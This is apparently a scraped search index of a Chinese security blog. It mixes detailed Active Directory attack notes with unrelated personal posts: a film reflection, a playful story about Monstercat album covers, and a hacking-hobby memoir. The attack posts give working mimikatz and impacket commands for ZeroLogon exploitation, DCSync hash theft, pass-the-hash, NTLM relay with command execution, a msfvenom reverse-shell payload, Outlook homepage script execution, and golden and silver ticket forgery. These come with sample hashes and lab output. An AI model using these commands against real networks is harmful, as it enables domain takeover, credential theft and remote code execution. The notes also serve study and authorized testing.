87e2812ccea41210c80e298c9e2a43a249d6a4056027787774340fbfd4b5f969563803b0f1bae7ccd24b29b41ae611025f1952793562d73e7f4e0f8938b3361332b35dd5ee22785b79b922149db32dc5c9301f4fd9fd090f532575bf5197a9c9230955bfd96ab928ae66b3999730c75b8545e26770816f21f2dbf9dbb19432211a91224c4c618507f7091ae09435a13a04bad5f056e72d34a96f67fa33d50e7596eca7709f398d98ba9e07407d7b2e4b937e40d1bf5ff0eb2240bdf0e8287e26ea5f8e69219fa7b1c5aa0e0bd8b992a176c32b0efb914fa6c1e53d69179110b02dfc1b1a0e53b445b92588420af18960 不建议使用： 比较暴力，会再打一次，计算密码的时候使用了空密码的hash去计算session_key https://github.com/risksense/zerologon - reinstall_original_pw.py 1python3 reinstall_original_pw.py DC_NETBIOS_NAME DC_IP_ADDR ORIG_NT_HASH mimikatz版本poc1shell C:\\Intel\\mimikatz.exe &quot;lsadump::zerologon /target:192.168.1.4 /account:LX-DC01$&quot; &quot;exit&quot; 1lsadump::zerologon /target:192.168.1.4 /account:LX-DC01$ exploit1shell C:\\Intel\\mimikatz.exe &quot;lsadump::zerologon /target:LX-DC01.AAAA.COM /account:LX-DC01$ /exploit&quot; &quot;exit&quot; 1lsadump::zerologon /target:LX-DC01.AAAA.COM /account:LX-DC01$ /exploit 获取域管administrator的hash1shell C:\\Intel\\mimikatz.exe &quot;lsadump::dcsync /domain:AAAA.COM /dc:LX-DC01.AAAA.COM /user:administrator /authuser:LX-DC01$ /authdomain:AAAA /authpassword: /authntlm&quot; &quot;exit&quot; 1lsadump::dcsync /domain:AAAA.COM /dc:LX-DC01.AAAA.COM /user:administrator /authuser:LX-DC01$ /authdomain:AAAA /authpassword: /authntlm hash 注入起一个域管cmd1shell C:\\Intel\\mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:administrator /domain:AAAA /ntlm:be833ac3f39c0f843b1b653d37c34dbe&quot; &quot;exit 12privilege::debugsekurlsa::pth /user:administrator /domain:AAAA /ntlm:be833ac3f39c0f843b1b653d37c34dbe 通过域管cmd，恢复域控机器账户密码1shell C:\\Intel\\mimikatz.exe &quot;lsadump::postzerologon /target:192.168.1.4 /account:LX-DC01$&quot; &quot;exit&quot; 1lsadump::postzerologon /target:192.168.1.4 /account:LX-DC01$","link":"/2021/03/12/%E5%9F%9F%E6%B8%97%E9%80%8F-ZeroLogon%E7%9A%84%E5%88%A9%E7%94%A8/"},{"title":"域渗透|Relay","text":"Relay（中继） Relay简介https://www.se7ensec.cn/2021/10/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%89%96%E6%9E%90/#%E7%BD%91%E7%BB%9C%E8%AE%A4%E8%AF%81%EF%BC%88Net-NTLM%EF%BC%89 在Net-NTLM Hash的破解里面，如果是v1的话，拿到Net-NTLM就相当于拿NTLM HASH，这个时候就没有Relay的必要性了。 但是在实际中遇到的例子往往是v2，这个时候密码强度高一点，基本就跑不出来了，这种情况下不妨试一试Relay。 详细分析https://en.hackndo.com/ntlm-relay/#authentication-vs-session 获取net-ntlm hash常用技巧https://daiker.gitbook.io/windows-protocol/ntlm-pian/5#0x00-qian-yan 123456789101112131415161718190x01 图标 1.desktop.ini 2.scf 文件 3.用户头像0x02 系统命令携带UNC路径0x03 XSS0x04 outlook0x05 PDF0x06 office0x07 MySQL0x08 NBNS和LLMNR 1. LLMNR 2. NBNS0x09 WPAD和mitm6 1. 配合LLMNR/NBNS投毒 2. 配合DHCPv60x10 XXE &amp;&amp; SSRF 1. XXE 2. SSRF 案例NBNS和LLMNR - https://xedex.gitbook.io/internalpentest/internal-pentest/active-directory/initial-attack-vectors/llmnr-nbt-ns-poisoning/smb-relay WPAD和mitm6 - https://xedex.gitbook.io/internalpentest/internal-pentest/active-directory/initial-attack-vectors/ipv6-attacks exchange+rpc+全补丁方案技巧https://evi1cg.me/archives/NTLMRelay.html#%E4%B8%BB%E5%8A%A8%E8%A7%A6%E5%8F%91 https://www.anquanke.com/post/id/194514#h3-6 123456789Exchange \\CVE-2018-8581 \\CVE-2019-1040 \\CVE-2020-17141/CVE-2020-17143RPC \\打印机Bug \\PetitPotamAD CS/PKI \\AD CS进行攻击 案例Exploiting CVE-2019-1040 - Combining relay vulnerabilities for RCE and Domain Admin - https://dirkjanm.io/exploiting-CVE-2019-1040-relay-vulnerabilities-for-rce-and-domain-admin/ CVE-2019-1040[算是上面的中文版本] - https://www.cnblogs.com/car7n/p/15143730.html NTLM relaying to AD CS - On certificates, printers and a little hippo - https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/ AD CS/PKI template exploit via PetitPotam and NTLMRelayx, from 0 to DomainAdmin in 4 steps - https://www.bussink.net/ad-cs-exploit-via-petitpotam-from-0-to-domain-domain/ 工具集成https://github.com/Ridter/RelayX 关于签名详细介绍https://www.thehacker.recipes/ad/movement/ntlm/relay#theory SMB签名SMB签名以最低要求的方式工作。如果客户端或服务器都不需要签名，则不会对会话进行签名（因为性能问题） 域控默认开启smb签名，而其他域机器默认不开启 ldap签名默认情况下，ldap服务器就在域控里面，而且默认策略就是协商签名，而不是强制签名。 也就是说是否签名是由客户端决定的。服务端跟客户端协商是否签名。 微软公司于 2019-09-11 日发布相关通告称微软计划于 2020 年 1 月发布安全更新。为了提升域控制器的安全性，该安全更新将强制开启所有域控制器上 LDAP channel binding 与 LDAP signing 功能。 webadv或httpwebadv或者http协议，是不要求签名的。 Relay2SMB能直接relay到smb服务器，是最直接最有效的方法。可以直接控制该服务器(包括但不限于在远程服务器上执行命令，上传exe到远程命令上执行，dump服务器的用户hash等等等等)。 SMB版本信息不同Windows版本所对应的smb版本，smb版本越高，内置的安全机制就越完善,利用难度也就越大。 对一些打了ms08-068[KB957097]补丁的老系统[比如windows xp/2003以下的系统]利用是无效的。 另外，它默认工作在tcp/udp的139和445端口上,属上层协议[偏应用层]。 Smb v1 主要用于xp/2003以下的系统中Smb v2.x 主要用于win vista/7/2008/2008r2Smb v3.x 主要用于win 8/8.1/2012/2012r2/2016 利用环境工作组这个实用性比较差。在工作组环境里面，工作组中的机器之间相互没有信任关系，每台机器的账号密码Hash只是保存在自己的SAM文件中。 这个时候Relay到别的机器，除非两台机器的账号密码一样(如果账号密码一样，我为啥不直接pth呢)，不然没有别的意义了，这个时候的攻击手段就是将机器reflect回机子本身。 因此微软在ms08-068中对smb reflect到smb 做了限制，这个补丁在CVE-2019-1384(Ghost Potato)被绕过。 域环境域环境下域用户的账号密码Hash保存在域控的ntds.dit里面。 如下没有限制域用户登录到某台机子，那就可以将该域用户Relay到别人的机子，或者是拿到域控的请求，将域控Relay到普通的机子，比如域管运维所在的机子。(为啥不Relay到其他域控，看上面的smb签名一节) 下面演示使用几款工具在域环境底下，从域控relay到普通机器执行命令 签名扫描Nmap12345678910111213nmap -Pn -sT -p 445 --open --script smb-security-mode,smb-os-discovery 192.168.3.73PORT STATE SERVICE445/tcp open microsoft-dsHost script results:| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default) #未开启签名状态 Nmap done: 1 IP address (1 host up) scanned in 15.07 seconds RunFinger.py(responder)12python3 RunFinger.py -i 192.168.3.73[SMB2]:['192.168.3.73', Os:'Windows 8.1/Server 2012R2', Build:'9600', Domain:'ROOTKIT', Bootime: 'Last restart: 2020-11-04 23:10:36', Signing:'False', RDP:'True', SMB1:'Enabled'] CrackMapExec123crackmapexec smb --gen-relay-list smb_targets.txt 192.168.1.0/24SMB 192.168.3.73 445 SRV-WEB-KIT [*] Windows Server 2012 R2 Datacenter 9600 x64 (name:SRV-WEB-KIT) (domain:rootkit.org) (signing:False) (SMBv1:True)SMB 192.168.3.144 445 OWA2013 [*] Windows Server 2012 Datacenter 9200 x64 (name:OWA2013) (domain:rootkit.org) (signing:True) (SMBv1:True) 利用方式smbrelayx.py(impacket)执行命令123456789101112131415161718python3 smbrelayx.py -h 192.168.3.73 -c whoamiImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation[*] Running in relay mode[*] Setting up SMB Server[*] Setting up HTTP Server[*] Servers started, waiting for connections[*] SMBD: Received connection from 192.168.3.144, attacking target 192.168.3.73[*] Authenticating against 192.168.3.73 as ROOTKIT\\Administrator SUCCEED[*]Administrator::ROOTKIT:62d492858382dd2c:4b986e30ac673950282a482da8b853ab:0101000000000000f21369d8550dd8012b83d77586a84e860000000002000e0052004f004f0054004b0049005400010016005300520056002d005700450042002d004b00490054000400160072006f006f0074006b00690074002e006f007200670003002e005300720076002d005700650062002d004b00690074002e0072006f006f0074006b00690074002e006f00720067000500160072006f006f0074006b00690074002e006f007200670007000800f21369d8550dd801060004000200000008003000300000000000000000000000003000002e29eb7b257b04893a3e81decc305f549463f3e3c6ed2320d434a909dca236d10a001000000000000000000000000000000000000900120063006900660073002f006300310032003300000000000000000000000000[*] Sending status code STATUS_SUCCESS after authentication to 192.168.3.144[*] Service RemoteRegistry is in stopped state[*] Starting service RemoteRegistry[*] Executed specified command on host: 192.168.3.73nt authority\\system[*] Stopping service RemoteRegistry 木马上线 msf的监听要设置 set AutoRunScript migrate，成功得到 session 后会自动迁移进程，如果没有设置，在 Removing file 的时候会话也随之结束。 12msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.3.211 LPORT=4444 -f exe &gt; shell.exepython3 smbrelayx.py -h 192.168.3.73 -e ./shell.exe （-e选项在目标主机上传并运行payload） ntlmrelayx.py(impacket) ntlmrelayx.py是对 smbrelayx 的改进，支持多种协议进行中继。ntlmrelayx.py 可以直接用现有的 hash 去尝试重放指定的机器。 执行命令123456789101112131415161718192021222324252627python3 ntlmrelayx.py -t smb://192.168.3.73 -c whoami -smb2support[*] Protocol Client SMTP loaded..[*] Protocol Client RPC loaded..[*] Protocol Client SMB loaded..[*] Protocol Client DCSYNC loaded..[*] Protocol Client IMAP loaded..[*] Protocol Client IMAPS loaded..[*] Protocol Client MSSQL loaded..[*] Protocol Client HTTPS loaded..[*] Protocol Client HTTP loaded..[*] Protocol Client LDAP loaded..[*] Protocol Client LDAPS loaded..[*] Running in relay mode to single host[*] Setting up SMB Server[*] Setting up HTTP Server[*] Setting up WCF Server[*] Servers started, waiting for connections[*] SMBD-Thread-4: Connection from ROOTKIT/ADMINISTRATOR@192.168.3.144 controlled, attacking target smb://192.168.3.73[*] Authenticating against smb://192.168.3.73 as ROOTKIT/ADMINISTRATOR SUCCEED[*] SMBD-Thread-4: Connection from ROOTKIT/ADMINISTRATOR@192.168.3.144 controlled, but there are no more targets left![*] Service RemoteRegistry is in stopped state[*] Starting service RemoteRegistry[*] Executed specified command on host: 192.168.3.73nt authority\\system[*] Stopping service RemoteRegistry 木马上线1python3 ntlmrelayx.py -t 10.0.0.33 -smb2support -e test.exe 转储hash12下面的命令将尝试通过SMB中继身份验证，并尝试从远程目标的SAM转储HASH(如果中继受害者拥有正确的特权)。python3 ntlmrelayx.py -t smb://192.168.3.73 -smb2support socks组合拳We’re currently supporting tunneling connections through SOCKS for SMB, MSSQL, SMTP, IMAP/S, HTTP/S. 123运行后输入socks中继提示符，我们可以看到可用的活动连接，以及会话是否对目标具有管理员权限。python3 ntlmrelayx.py -t smb://192.168.3.73 -socks -smb2support设置proxychains.conf为socks5 127.0.0.1 1080，所有经过代理的工具都会自带认证信息。 SMB Relay - https://aas-s3curity.gitbook.io/cheatsheet/internalpentest/active-directory/exploitation/exploit-without-account/smb-relay Playing with Relayed Credentials - https://www.secureauth.com/blog/playing-with-relayed-credentials/ MultiRelay.py(responder)交互shell1python3 MultiRelay.py -t 192.168.3.73 -u ALL # 返回一个shell，kali环境缺库这里就不测了 Relay2EWSExchange的认证也是支持NTLM SSP的。我们可以relay Exchange，从而收发邮件，代理等等。在使用outlook的情况下还可以通过homepage或者下发规则达到命令执行的效果。而且这种Relay还有一种好处，将Exchange开放在外网的公司并不在少数，我们可以在外网发起relay，而不需要在内网，这是最刺激的。(https://daiker.gitbook.io/windows-protocol/ntlm-pian/6#2.-relay2ews) 利用工具https://github.com/Arno0x/NtlmRelayToEWS 命令执行配合homepage 能够实现命令执行的效果，homepage的简易demo代码如下 123456789101112131415161718192021&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Language&quot; content=&quot;en-us&quot;&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=windows-1252&quot;&gt;&lt;title&gt;Outlook&lt;/title&gt;&lt;script id=clientEventHandlersVBS language=vbscript&gt;&lt;!-- Sub window_onload() Set Application = ViewCtl1.OutlookApplication Set cmd = Application.CreateObject(&quot;Wscript.Shell&quot;) cmd.Run(&quot;calc&quot;) End Sub--&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;object classid=&quot;clsid:0006F063-0000-0000-C000-000000000046&quot; id=&quot;ViewCtl1&quot; data=&quot;&quot; width=&quot;100%&quot; height=&quot;100%&quot;&gt;&lt;/object&gt;&lt;/body&gt;&lt;/html&gt; Relay2LDAP签名扫描https://github.com/zyn3rgy/LdapRelayScan 三种通用思路不管是杀伤力巨大的8581还是1040，Relay到ldap都在里面发挥着巨大的作用。 这里着重介绍三种通用性比较强的利用思路。这三种在impacket里面的ntlmrelayx都有实现。 (这三种通用性比较强而已，实际中这个的利用比较灵活，需要通过nTSecurityDescriptor分析用户在域内对哪些acl有权限，什么权限。关于acl怎么深入利用,这里不再展开，后面在ldap篇[https://daiker.gitbook.io/windows-protocol/ldap-pian] 会详细说明。) 高权限用户如果NTLM发起用户在以下用户组 Enterprise admins Domain admins Built-in Administrators Backup operators Account operators 那么就可以将任意用户拉进该组，从而使该用户称为高权限用户，比如域管。 write-acl权限如果发起者对DS-Replication-GetChanges(GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)和DS-Replication-Get-Changes-All(1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)有write-acl权限，那么就可以在该acl里面添加任意用户，从而使得该用户可以具备dcsync的权限。 这个案例的典型例子就是Exchange Windows Permissions组，我们将在下一篇介绍8581的 时候详细说下这个用户组的权限。 普通用户权限server2012r2之后在server2012r2之后，如果没有以上两个权限。可以通过设置基于资源的约束委派。 在NTLM发起者马上到msDS-AllowedToActOnBehalfOfOtherIdentity属性里面添加一条ace,可以让任何机器用户和服务用户可以控制该用户(NTLM发起者)，在这里可能需要新增一台Computer账号或者控制一台机器。 案例两全其美：结合 NTLM 中继和 Kerberos 委托 - https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/ 渗透小记 - 中继和委派的实战利用 - https://mp.weixin.qq.com/s/rAM3uWimRriY3lKCHhH8Xg Server2016之后在Server2016之后，支持属性msDS-KeyCredentialLink,添加了这个属性以后，就可以利用证书来获取对应主机权限，详细可参考Shadow Credentials 参考https://www.thehacker.recipes/a-d/movement/ntlm/relay - 基本攻击思路导图和命令记录【很重要】 https://forum.butian.net/share/2087 - 奇安信攻防社区-NTLM realy https://forum.butian.net/share/1944 - 红队域渗透NTLM Relay：强制认证方式总结 https://daiker.gitbook.io/windows-protocol/ntlm-pian/6#0x02-relay - 代课人永远的神 https://www.cnblogs.com/car7n/p/14887818.html - NTLM Relay https://www.freebuf.com/articles/network/244375.html - 内网渗透测试：NTLM Relay攻击分析","link":"/2021/11/01/%E5%9F%9F%E6%B8%97%E9%80%8F-Relay/"},{"title":"域渗透|票据伪造","text":"票据伪造 黄金票据GoldenTickethttps://www.se7ensec.cn/2021/10/20/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberos%E5%9F%9F%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%89%96%E6%9E%90/#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE 简介Golden Ticket（下面称为金票）是通过伪造的TGT（TicketGranting Ticket），因为只要有了高权限的TGT，那么就可以发送给TGS换取任意服务的ST。可以说有了金票就有了域内的最高权限。 制作金票的条件 1、域名称2、域的SID值3、域的KRBTGT账户密码HASH4、伪造用户名，可以是任意的 利用过程mimikatz金票的生成需要用到krbtgt的密码HASH值，可以通过mimikatz中的命令获取krbtgt的值。 1lsadump::dcsync /OWA2013.rootkit.org /user:krbtgt 得到KRBTGT HASH之后使用mimikatz中的kerberos::golden功能生成金票golden.kiribi，即为伪造成功的TGT。 /user：伪造的用户名/domain：域名称/sid：SID值，注意是去掉最后一个-后面的值/krbtgt：krbtgt的HASH值/ptt：表示的是Pass The Ticket攻击，是把生成的票据导入内存，也可以使用/ticket导出之后再使用 12mimikatz.exe &quot;kerberos::golden /user:administrator /domain:rootkit.org /sid:S-1-5-21-3759881954-2993291187-3577547808 /krbtgt:c3d5042c67ef5f461d0ba6ecdd9ea449 /ptt&quot; exitklist / kerberos::list 列出当前的所有票据 此时就可以通过dir成功访问域控的共享文件夹。 1dir \\\\OWA2013.rootkit.org\\c$ impacket123456781. 清空票据klist purge2. 制作ccache文件python ticketer.py -nthash c3d5042c67ef5f461d0ba6ecdd9ea449 -domain-sid S-1-5-21-3759881954-2993291187-3577547808 -domain rootkit.org administrator3. 更改环境变量set KRB5CCNAME=administrator.ccache / export KRB5CCNAME=administrator.ccache4. 验证成果python wmiexec.py rootkit.org/administrator@OWA2013 -k -no-pass 白银票据SilverTicketshttps://www.se7ensec.cn/2021/10/20/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberos%E5%9F%9F%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%89%96%E6%9E%90/#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE 具体什么服务需要使用什么票据，参考这里 How Attackers Use Kerberos Silver Tickets to Exploit Systems https://adsecurity.org/?p=2011 Service Type Service Silver Tickets WMI HOST,RPCSS PowerShell Remoting HOST,HTTP(WSMAN,RPCSS) WinRM HOST,HTTP Scheduled Tasks HOST Windows File Share (CIFS) CIFS LDAP operations including Mimikatz DCSync LDAP Windows Remote Server Administration Tools RPCSS,LDAP,CIFS 简介Silver Tickets（下面称银票）就是伪造的ST（Service Ticket），因为在TGT已经在PAC里限定了给Client授权的服务（通过SID的值），所以银票只能访问指定服务。 制作银票的条件 1、域名称2、域SID3、目标服务器的FQDN（Fully Qualified Domain Name全限定域名，即同时带有主机名和域名的名称。）4、可利用的服务（运行在目标服务器上的kerberos服务，该服务主体名称类型如cifs，http，mssql等）5、服务账号的NTLM Hash（如果是域控制器机器账号，那就代表DC已经被拿下了）6、需要伪造的用户名，可以是任意的，这里是silver 利用过程mimikatz首先我们需要知道服务账户的密码HASH，这里同样拿域控来举例（注意，这里使用的不是Administrator账号的HASH，而是OWA2013$的） 参数说明： /domain：当前域名称/sid：SID值，和金票一样取前面一部分/target：目标主机，这里是OWA2013.rootkit.org/service：服务名称，这里需要访问共享文件，所以是cifs/rc4：服务账户的NTLM HASH 值 (OWA2013$)/user：伪造的用户名/ptt：表示的是Pass The Ticket攻击，是把生成的票据导入内存，也可以使用/ticket导出之后再使用 用kerberos::ptt来导入 1234567891. 伪造 cifs 服务权限mimikatz &quot;kerberos::golden /domain:rootkit.org /sid:S-1-5-21-3759881954-2993291187-3577547808 /target:OWA2013.rootkit.org /service:cifs /rc4:ddd2162e8606006dcca0e29b7819721a /user:silver /ptt&quot; exitklistdir \\\\OWA2013.rootkit.org\\c$2. 伪造 LDAP 服务权限mimikatz &quot;kerberos::golden /domain:rootkit.org /sid:S-1-5-21-3759881954-2993291187-3577547808 /target:OWA2013.rootkit.org /service:LDAP /rc4:ddd2162e8606006dcca0e29b7819721a /user:silver /ptt&quot; exitklistmimikatz &quot;lsadump::dcsync /dc:OWA2013.rootkit.org /domain:rootkit.org /user:krbtgt&quot; exit... impacket123456781. 伪造 cifs 服务权限python3 ticketer.py -nthash ddd2162e8606006dcca0e29b7819721a -domain-sid S-1-5-21-3759881954-2993291187-3577547808 -domain rootkit.org -dc-ip 192.168.3.144 -spn cifs/OWA2013.rootkit.org silver2. 伪造 LDAP 服务权限python3 ticketer.py -nthash ddd2162e8606006dcca0e29b7819721a -domain-sid S-1-5-21-3759881954-2993291187-3577547808 -domain rootkit.org -dc-ip 192.168.3.144 -spn ldap/OWA2013.rootkit.org silverset KRB5CCNAME=silver.ccache / export KRB5CCNAME=silver.ccachepython wmiexec.py -k OWA2013.rootkit.org 增强版的黄金票据EnhancedGolden Tickets在Golden Ticket部分说明可利用krbtgt的密码HASH值生成金票，从而能够获取域控权限同时能够访问域内其他主机的任何服务。 但是普通的金票不能够跨域使用，也就是说金票的权限被限制在当前域内。 域树与域林NEWS.rootkit.org和 DEV.rootkit.org 均为rootkit.org的子域，这三个域组成了一个域树。 同样test.org也是一个单独的域树，两个域树 rootkit.org 和 test.org 组合起来被称为一个域林。 普通金票的局限性根域和其他域的最大的区别就是根域对整个域林都有控制权。 而域正是根据Enterprise Admins组来实现这样的权限划分。 Enterprise Admins组EnterpriseAdmins组是域中用户的一个组，只存在于一个林中的根域中，这个组的成员，这里也就是rootkit.org中的Administrator用户（不是本地的Administrator，是域中的Administrator）对域有完全管理控制权。 rootkit.org的域控上Enterprise Admins组的RID为519。 Domain Admins组子域中是不存在EnterpriseAdmins组的，在一个子域中权限最高的组就是Domain Admins组。 NEWS.rootkit.org这个子域中的Administrator用户，这个Administrator只有当前域的最高权限。 利用过程mimikatz普通的黄金票据被限制在当前域内，在2015年Black Hat USA中国外的研究者提出了突破域限制的增强版的黄金票据。 通过域内主机在迁移时LDAP库中的SIDHistory属性中保存的上一个域的SID值制作可以跨域的金票。 如果知道根域的SID那么就可以通过子域的KRBTGT的HASH值，使用mimikatz创建具有EnterpriseAdmins组权限（域林中的最高权限）的票据。 然后通过mimikatz重新生成包含根域SID的新的金票 1mimikatz &quot;kerberos::golden /admin:administrator /domain:news.rootkit.org` /sid:子域sid /sids:根域sids /krbtgt:子域krbtgt的hash /startoffset:0 /endin:600 /renewmax:10080 /ptt&quot; exit 参考：https://adsecurity.org/?p=1640 Startoffffset和endin分别代表偏移量和长度，renewmax表示生成的票据的最长时间。 注意这里是不知道根域rootkit.org的krbtgt的密码HASH的，使用的是子域NEWS.rootkit.org中的KRBTGT的密码HASH。 然后就可以通过dir访问OWA2013.rootkit.org的共享文件夹，此时的这个票据是拥有整个域林的控制权的。 参考https://github.com/uknowsec/Active-Directory-Pentest-Notes","link":"/2021/11/01/%E5%9F%9F%E6%B8%97%E9%80%8F-%E7%A5%A8%E6%8D%AE%E4%BC%AA%E9%80%A0/"},{"title":"《头文字D》-童年的美好回忆","text":"每天清晨都有一辆AE86在秋名山上漂移，而且速度快得惊人，这辆AE86属于藤原豆腐店。 今天下课在校园广播里听到Jay的《一路向北》，想起了这部电影，便重温了一下；伴随着年龄的增长，对电影内容的理解也会加深，用一句话来形容就是：小时候看的是赛车，长大点看的是纯纯的爱情，现在则更多的是美好的回忆和感悟。 带着“藤原豆腐店”几个字的白色AE86，在凌晨的秋名山上摇曳着光芒一晃而过 车中昏昏欲睡的少年，山头明明暗暗的灯塔 车行处，一阵风卷起片片落叶，路边沉默的地行菩萨 车里的豆浆涌成了一圈漩涡，却没有一滴倾洒 伴随着几个镜头，故事就这样拉开了序幕…… 第一次看的记忆已经很模糊了 只是每次音乐一起我就会想到那个夏天黏腻腻的夜晚 第二次再看时，应该是我初中毕业吧 刺激，甜蜜而又悲伤 现在再看来，完全就是回忆和感悟了 作为大多数的我们，还是像拓海同学吧 时时会觉得局促，尴尬，不自信 在面对爱情的得失时，总是会不知所措 拓海选择了加入Project D车队，坚定了自己的梦想 我们何尝不是也该如此呢 流年易逝去，青春不再来 每个人都该找到真正属于自己的世界","link":"/2017/12/06/%E5%A4%B4%E6%96%87%E5%AD%97D-%E7%AB%A5%E5%B9%B4%E7%9A%84%E7%BE%8E%E5%A5%BD%E5%9B%9E%E5%BF%86/"},{"title":"我们来给电喵编个故事吧","text":"怪兽猫英文名字Monstercat（原先叫Monstercat Media），是一个在2011年7月，由Mike Darlington（现任CEO）和Ari Paunonen（现任COO）在加拿大温哥华建立的电子舞曲音乐公司。 专辑封面讲述了一只怪喵打天下的励志故事，详见下文。。。 怪猫是某个星际舰队的指挥，可在途径地球时遭到了不明攻击，他只得带着祖传的耳机弃舰 飞船坠落，怪猫成功逃脱 逃脱后遇到一群地球的DJ，聊天后发现志趣相投于是成为了好基友 怪猫在谈论结束后（事后）思考猫生… 觉得无聊怪猫索性顺流而下趟着水，冒着淹死的风险不走岸上走河里，走向远方的城市（喵星人不怕水吗？） 他来到了加拿大的某个城市，遇到之前的好基友而那个好基友为他介绍了更多的好基友于是他们欢乐的搞基 怪猫发现有很多人围着一个舞台（聚众交易），坐在石头上又思考起了猫生，想到了远在宇宙另一边星球上他的人民 觉得思考猫生太无聊的怪猫决定加入交易会 这讲的是怪猫交易会圆满结束后和他的五个好基友一起搞一只鸡的故事 无聊的怪猫企图打败警察征服加拿大 经过精心周密的策划伟大的怪猫革命开始了，察那个臂徽可以看出来是MUSIC INDUSTRAY也就是指怪猫带领一队DJ向音乐界发出挑战 革命成功了的怪猫和好基友们快乐幸福地生活在一起 随着人们不断的觉醒怪猫觉得完成了大业很欣慰 于是事业有成的怪猫认识到了生活不只有眼前的苟且还有诗和远方，进行了一段长期的地质探索 表面上怪猫来到户外观看极光，可事实上看极光不需要天文望远镜，所以是怪猫在寻找自己的星球 怪猫来到矿洞探索地球的矿产资源 怪猫发现在矿洞的尽头有地下溶洞连通着深海，本想钓鱼充饥没想到钓到很多珠宝 怪猫以钓上来的宝物为线索，突破喵喵物种怕水的缺陷极限潜水，找到了沉船残骸 然后怪猫又凭着决心，勇攀高峰一览众山小 怪猫从顶峰一跃而下乘着滑翔伞来到当年梦想萌芽的地方 才发现多年之后他的好基友们还在忠实地等着他 怪猫为迎接他归来的人们举办了盛大的交易会 交易会结束后，怪猫和好基友们开心的在野外玩耍 此时的怪猫浑然不知城市上空早已阴云密布 回到城市后他发现一切都变了，一个和他是同类但只有眼睛的猫摧毁并占领了他一手建立的梦想之城 怪猫与黑猫进行了殊死搏斗，正当怪猫要使出绝招时黑猫召唤来了他开着宇宙飞船的好基友 怪猫被黑猫的宇宙飞船吸走了 回到了怪猫自己的星球后才发现最开始他乘坐的飞船受到了攻击，是由于黑猫展开了一场军事政变，将原本是领袖的怪猫赶下台 就在这时怪猫的好基友得知了这个消息誓死为怪猫报仇 怪猫在基友的帮助下打败了黑猫并夺回了耳机，取得了最终的胜利","link":"/2018/07/27/%E6%88%91%E4%BB%AC%E6%9D%A5%E7%BB%99%E7%94%B5%E5%96%B5%E7%BC%96%E4%B8%AA%E6%95%85%E4%BA%8B%E5%90%A7/"},{"title":"我的梦想是年少有为","text":"其实这篇文章是自己两年前写的，旧博客备份下来以后就安静的躺在硬盘里了，重新编辑下留做纪念吧。 天真又懵懂​ 初中住校，封闭式管理，大约16岁开始接触电脑，当时一个月放一次假，就回家打打单机游戏，后来总是想打破游戏的规则限制，于是就修改游戏的配置文件，或者直接开挂，可以说是我对这方面感兴趣的开始。 ​ 初升高的那个暑假，有一次搜索Q币充值截图生成器，发现了一个叫瑞雪的小朋友，12岁的他自学易语言，开发出这个软件，当时觉得很新奇。于就有了第一次接触编程软件的经历，但是因精力有限，没能坚持学下去，仅仅只会改改源码，拿着自己改的源码做的记事本软件，钓鱼软件，病毒生成软件……玩的不亦乐乎。 ​ 然后有一天在瑞雪的百度云里，无意间接触到了黑客这个词汇，虽然很熟悉，但是感觉很神秘，于是就开始百度，在看了一大堆屁用没有的介绍后，偶然发现了一个很吸引我的链接［玄风小组黑客网盘］，好奇的我点了进去发现有个登入密码，我试探性的输入了123，回车一摁，居然进去了！当时心里很激动(或许这就是最初次体验的破解密码的快感吧），黑色的网盘界面中，一个个从未见过的名词〔木马，抓鸡，渗透，远控，DDOS…〕引起了我强烈的好奇心。 中二且热血​ 转眼高中开学，依旧封闭式教育，只有周日下午半天和每个月的两天假期，每周日下午会和同学一起去网吧，当在同学在游戏世界里大喊着德玛西亚，奋力厮杀时，我就在一旁瞎研究。还记得当时自己每次都会把网盘里的部分软件下载下来，但是因为什么都不会，上来就是瞎摁，不过摁着摁着也就慢慢明白了软件的功能和使用方法。后来去书店买练习册时看到了一本书《黑客攻防实战从入门到精通》（其实内容都是一些过时的东西了），当时想都没想就把它买了下来，然后就开始了“进步最快”的一个阶段。因为平时没有办法出学校，所以就每天中午睡觉的时间都来看这本书，不会的就做下笔记，记了好多cmd命令，还贴在墙上，不懂得就找机会去百度查，差不多用了多半年的时间，感觉能看懂了书里的大部分内容。而且当时百度到了一套玄风小组的初级渗透教程，放在云盘里，放假有空就会看一下，然后就自己一步一步跟着视频学，虽然听起来很枯燥，不过每当我体会到了一些新的东西，就会觉得很满足，很开心。 ​ 上面那个ID和QQ上大学之后我都没再用过了，空间被我加了锁，锁住了逝去的青春，也锁住了所谓的“情窦初开”，现在只是当个游戏号。以上这个时间段，搞过别人，也被别人搞过，学的三脚猫功夫很多很杂，比如（钓鱼，盗号，社工，刷钻……很多东西就不贴图了，貌似是大多数人的必经之路啊），不过在后来的学习就不是很简单了，有些东西没有人告诉你，你要自己去百度，去过滤筛选有用的信息，一次又一次遇到瓶颈，然后突破，再次遇到瓶颈，再突破。遇到问题难以解决的的感觉很不好，但是当你自己突然领悟到它的真谛时，你会觉得豁然开朗，就这样自己慢慢接触的东西越来越多，会的也越来越多。 梦想和成长​ 